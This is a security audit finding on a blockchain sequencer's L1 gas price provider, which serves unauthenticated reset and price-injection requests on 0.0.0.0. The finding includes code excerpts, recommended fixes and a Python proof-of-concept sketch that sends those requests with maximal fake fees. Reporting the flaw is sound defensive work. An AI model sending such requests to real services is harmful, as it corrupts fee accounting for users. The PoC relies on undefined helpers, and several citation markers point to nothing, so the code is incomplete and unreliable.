### Title
Unauthenticated `AddGasPrice`/`Initialize` on the Remote L1 Gas Price Provider Allows Arbitrary Injection of L1 Gas Price Data into Committed Blocks - (File: `crates/apollo_l1_gas_price/src/l1_gas_price_provider.rs`, `crates/apollo_l1_gas_price/src/communication.rs`)

---

### Summary

The `L1GasPriceProvider` exposes `add_price_info` and `initialize` through a `RemoteComponentServer` bound to `0.0.0.0` with no caller authentication. Any network-reachable process can reset the internal ring buffer via `Initialize` and then inject arbitrary `GasPriceData` entries via `AddGasPrice`. Because the same shared provider is consumed by both the proposer and all validators in a distributed deployment, the corrupted mean L1 gas price propagates into every `ProposalInit` and is accepted by validators, causing committed blocks to carry wrong `l1_gas_price_fri`/`l1_data_gas_price_fri`/`l1_gas_price_wei`/`l1_data_gas_price_wei` values and therefore wrong fee accounting for every transaction in those blocks.

---

### Finding Description

**Root cause — `add_price_info` and `initialize` have no caller restriction.**

`L1GasPriceProvider::add_price_info` pushes a caller-supplied `GasPriceData` (block number, timestamp, `base_fee_per_gas`, `blob_fee`) into the internal `RingBuffer`. Its only guard is a consecutive-block-number check:

```rust
// crates/apollo_l1_gas_price/src/l1_gas_price_provider.rs  lines 102-121
pub fn add_price_info(&mut self, new_data: GasPriceData) -> L1GasPriceProviderResult<()> {
    let Some(samples) = &mut self.price_samples_by_block else {
        return Err(L1GasPriceProviderError::NotInitializedError);
    };
    if let Some(data) = samples.back() {
        if new_data.block_number != data.block_number + 1 {
            return Err(L1GasPriceProviderError::UnexpectedBlockNumberError { ... });
        }
    }
    samples.push(new_data);
    Ok(())
}
``` [1](#0-0) 

`initialize` replaces the ring buffer with a fresh empty one, which bypasses the consecutive-block-number check for the very next `add_price_info` call (because `samples.back()` returns `None` on an empty buffer):

```rust
// lines 96-100
pub fn initialize(&mut self) -> L1GasPriceProviderResult<()> {
    self.price_samples_by_block = Some(RingBuffer::new(self.config.storage_limit));
    Ok(())
}
``` [2](#0-1) 

**Both operations are exposed over the network without authentication.**

`ComponentRequestHandler` for `L1GasPriceProvider` dispatches all five `L1GasPriceRequest` variants — including `Initialize` and `AddGasPrice` — to the same handler with no caller check:

```rust
// crates/apollo_l1_gas_price/src/communication.rs  lines 23-39
async fn handle_request(&mut self, request: L1GasPriceRequest) -> L1GasPriceResponse {
    match request {
        L1GasPriceRequest::Initialize => L1GasPriceResponse::Initialize(self.initialize()),
        L1GasPriceRequest::AddGasPrice(data) =>
            L1GasPriceResponse::AddGasPrice(self.add_price_info(data)),
        ...
    }
}
``` [3](#0-2) 

The `RemoteComponentServer` handler deserializes the HTTP/2 body and forwards it directly to the local client with no IP allowlist, token, or identity check: [4](#0-3) 

In the production distributed and hybrid deployment configurations the server binds to `0.0.0.0`:

```json
"components.l1_gas_price_provider.remote_server_config.bind_ip": "0.0.0.0"
``` [5](#0-4) [6](#0-5) 

**How the corrupted price reaches committed blocks.**

`get_price_info` computes a mean over the ring buffer and returns it as the authoritative L1 gas price: [7](#0-6) 

The consensus orchestrator calls `get_l1_prices_in_fri_and_wei` → `get_price_info` when building a proposal, and the result is placed directly into `ProposalInit.l1_gas_price_fri`, `l1_data_gas_price_fri`, `l1_gas_price_wei`, `l1_data_gas_price_wei`: [8](#0-7) 

Validators call the same shared provider to obtain their reference price and then check the proposer's values within a margin (`l1_gas_price_margin_percent`): [9](#0-8) 

In a distributed deployment the provider is a single shared service. If the attacker corrupts it, both the proposer and all validators read the same manipulated mean, so the margin check passes and the block is committed with wrong gas prices.

---

### Impact Explanation

Committed blocks carry wrong `l1_gas_price_fri`, `l1_data_gas_price_fri`, `l1_gas_price_wei`, and `l1_data_gas_price_wei`. Every transaction in those blocks has its fee computed against the wrong price, producing incorrect fee charges, incorrect refunds, and incorrect balance changes for all users — a direct economic impact matching the "Incorrect fee, gas, bouncer, resource accounting, refund, balance, or L1 gas price effect with economic impact" critical impact class.

---

### Likelihood Explanation

In the distributed and hybrid deployment topologies the `RemoteL1GasPriceServer` is the only component that holds the L1 gas price state and it is bound to `0.0.0.0`. Any process that can reach the configured port — including a co-tenant in the same Kubernetes namespace or a misconfigured network policy — can send a valid HTTP/2 binary-serialized `L1GasPriceRequest::Initialize` followed by `L1GasPriceRequest::AddGasPrice` messages. No credentials, signatures, or prior state are required. The attack is fully scriptable with a single HTTP/2 client.

---

### Recommendation

1. **Restrict `AddGasPrice` and `Initialize` to the scraper only.** The simplest fix is to split the `L1GasPriceProviderClient` trait into a read-only interface (exposed remotely) and a write interface (local-only, used only by `L1GasPriceScraper`). The `RemoteComponentServer` should only serve `GetGasPrice`, `GetEthToFriRate`, and `GetStrkToUsdRate`.

2. **Add mutual TLS or a shared secret** to the `RemoteComponentServer` so that only the scraper process can call write operations if the split-interface approach is not immediately feasible.

3. **Bind the server to `127.0.0.1`** (or the pod-internal address) rather than `0.0.0.0` when the scraper and provider run in the same pod.

---

import httpx
import binascii

# Attacker sends L1GasPriceRequest::Initialize to reset the ring buffer,
# then injects a ring buffer full of fake high-price entries.
# Both messages are binary-serialized (bincode/serde) L1GasPriceRequest values.

PROVIDER_URL = "http://<l1-service-host>:<port>/"

# Step 1: Reset the ring buffer (Initialize variant = enum index 0)
init_payload = serialize_l1_gas_price_request_initialize()
httpx.post(PROVIDER_URL, content=init_payload,
           headers={"content-type": "application/octet-stream",
                    "x-request-id": "1"})

# Step 2: Fill the ring buffer with fake prices
# storage_limit entries, each with base_fee_per_gas = u128::MAX and blob_fee = u128::MAX
for block_num in range(storage_limit):
    add_payload = serialize_l1_gas_price_request_add_gas_price(
        block_number=block_num,
        timestamp=block_num * 12,
        base_fee_per_gas=2**128 - 1,
        blob_fee=2**128 - 1,
    )
    httpx.post(PROVIDER_URL, content=add_payload,
               headers={"content-type": "application/octet-stream",
                        "x-request-id": str(block_num + 2)})

# Result: get_price_info now returns mean(u128::MAX, ...) ≈ u128::MAX for both
# base_fee_per_gas and blob_fee.  The next ProposalInit will carry these values.
# Validators query the same provider and accept the proposal within the margin.
# All transactions in the committed block are charged at the manipulated price.

    async fn remote_component_server_handler(
        http_request: HyperRequest<Incoming>,
        request_id: RequestId,
        client_peer: SocketAddr,
        local_client: LocalComponentClient<Request, Response>,
        metrics: &'static RemoteServerMetrics,
        max_request_body_bytes: usize,
    ) -> Result<HyperResponse<Full<Bytes>>, hyper::Error> {
        trace!("Received HTTP request: {http_request:?}");
        let body_bytes =
            match Limited::new(http_request.into_body(), max_request_body_bytes).collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(err) => {
                    warn!("Request body too large: {err}");
                    let server_error = ServerError::RequestBodyTooLarge(err.to_string());
                    return Ok(HyperResponse::builder()
                        .status(StatusCode::PAYLOAD_TOO_LARGE)
                        .header(CONTENT_TYPE, APPLICATION_OCTET_STREAM)
                        .body(Full::new(Bytes::from(
                            SerdeWrapper::new(server_error)
                                .wrapper_serialize()
                                .expect("Server error serialization should succeed"),
                        )))
                        .expect("Response building should succeed"));
                }
            };
        trace!("Extracted {} bytes from HTTP request body", body_bytes.len());

        metrics.increment_total_received();

        let http_response = match SerdeWrapper::<Request>::wrapper_deserialize(&body_bytes)
            .map_err(|err| ClientError::ResponseDeserializationFailure(err.to_string()))
        {
            Ok(request) => {
                trace!(
                    remote_addr = %client_peer,
                    request_id = %request_id,
                    request_type = request.request_label(),
                    "remote component request",
                );
                trace!("Successfully deserialized request: {request:?}");
                metrics.increment_valid_received();

                // Wrap the send operation in a tokio::spawn as it is NOT a cancel-safe operation.
                // Even if the current task is cancelled, the inner task will continue to run.
                // Note: this creates a new request ID for the local client.
                let response = tokio::spawn(async move { local_client.send(request).await })
                    .await
                    .expect("Should be able to extract value from the task");

                metrics.increment_processed();

                match response {
                    Ok(response) => {
                        trace!("Local client processed request successfully: {response:?}");
                        HyperResponse::builder()
                            .status(StatusCode::OK)
                            .header(CONTENT_TYPE, APPLICATION_OCTET_STREAM)
                            .body(Full::new(Bytes::from(
                                SerdeWrapper::new(response)
                                    .wrapper_serialize()
                                    .expect("Response serialization should succeed"),
                            )))
                    }
                    Err(error) => {
                        panic!(
                            "Remote server failed sending with its local client. Error: {error:?}"
                        );
                    }
                }
            }
            Err(error) => {
                error!("Failed to deserialize request: {error:?}");
                let server_error = ServerError::RequestDeserializationFailure(error.to_string());
                HyperResponse::builder().status(StatusCode::BAD_REQUEST).body(Full::new(
                    Bytes::from(
                        SerdeWrapper::new(server_error)
                            .wrapper_serialize()
                            .expect("Server error serialization should succeed"),
                    ),
                ))
            }
        }
        .expect("Response building should succeed");
        trace!("Built HTTP response: {http_response:?}");

        Ok(http_response)
    }
